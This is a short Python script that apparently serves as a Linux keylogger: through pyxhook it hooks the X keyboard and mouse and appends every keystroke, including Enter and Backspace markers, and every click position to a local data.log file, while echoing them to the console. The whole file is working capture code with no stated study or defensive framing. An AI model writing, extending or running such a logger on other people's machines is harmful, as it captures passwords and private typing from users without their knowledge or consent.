import os
from datetime import datetime
import pyxhook


parentdirec=os.getcwd()
path=os.path.join(parentdirec,"logs")
#log_file = f'{path}/{datetime.now().strftime("%d-%m-%Y")}.log'
log_file = f'{path}/data.log'

def mousepress(event):
    with open(log_file, "a") as f:  
        if event.detail==1:
            f.write(" left click - ({0},{1})\n".format(event.root_x,event.root_y))
            print(" left click - ({0},{1})".format(event.root_x,event.root_y))
        if event.detail==2:
            f.write(" middle click - ({0},{1})\n".format(event.root_x,event.root_y))
            print("middle click - ({0},{1})".format(event.root_x,event.root_y))
        if event.detail==3:
            f.write(" right click - ({0},{1})\n".format(event.root_x,event.root_y))
            print("right click - ({0},{1})".format(event.root_x,event.root_y))
            
def OnKeyPress(event):
    #print(event.WindowProcName)
    with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
        if event.Key == 'Return' :
            f.write(' [ENTER]\n{0} '.format(datetime.now().strftime("%H:%M:%S")))
            print('[ENTER]\n')
        elif event.Key == 'BackSpace' :
            f.write(' [BACKSPACE] ')
            print(' [BACKSPACE] ')
        elif event.Key == 'Escape' :
            f.write(' [ESC] ')
            print(' [ESC] ')
        elif event.Key == 'Caps_Lock' :
            f.write(' [CAPS LOCK] ')
            print(' [CAPS LOCK] ')
        elif event.Key == 'Control_L' :
            f.write(' [CTRL L] ')
            print(' [CTRL L] ')
        elif event.Key == 'Control_R' :
            f.write(' [CTRL R] ')
            print(' [CTRL R] ')
        elif event.Key == 'Shift_L' :
            f.write(' [SHIFT L] ')
            print(' [SHIFT L] ')
        elif event.Key == 'Shift_R' :
            f.write(' [SHIFT R] ')
            print(' [SHIFT R] ')
        elif len(event.Key)>1:
            f.write(f"{chr(event.Ascii)}")
            print(event.Key)
        else:
            f.write(event.Key)
            print(event.Key)
        
# Create a hook manager object
hook1 = pyxhook.HookManager()
hook1.buttonpressevent= mousepress
hook1.mousemoveevent= mousepress

hook2 = pyxhook.HookManager()
hook2.KeyDown=OnKeyPress

hook1.HookMouse()  # set the hook
hook2.HookKeyboard()
hook1.start()
hook2.start()